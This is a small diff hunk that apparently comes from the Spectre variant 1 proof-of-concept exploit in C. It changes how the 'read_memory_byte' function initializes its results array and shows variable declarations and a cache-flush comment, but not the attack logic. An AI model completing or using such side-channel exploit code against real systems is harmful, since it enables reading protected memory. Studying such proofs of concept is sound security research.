@@ -38,14 +38,11 @@ void __attribute__ ((noinline)) victim_function(size_t x) {
 
 /* Report best guess in value[0] and runner-up in value[1] */
 void read_memory_byte(size_t malicious_x, uint8_t value[2], int score[2]) {
-	static int results[256];
-	int tries, i, j, k, mix_i;
+	int tries, i, j, k, mix_i, results[256] = { 0 };
 	unsigned int junk = 0;
 	size_t training_x, x;
 	register uint64_t time1, time2;
 	volatile uint8_t *addr;
-
-	for (i = 0; i < 256; i++) { results[i] = 0; }
 
 	for (tries = 999; tries > 0; tries--) {
 		/* Flush array2[256*(0..255)] from cache */
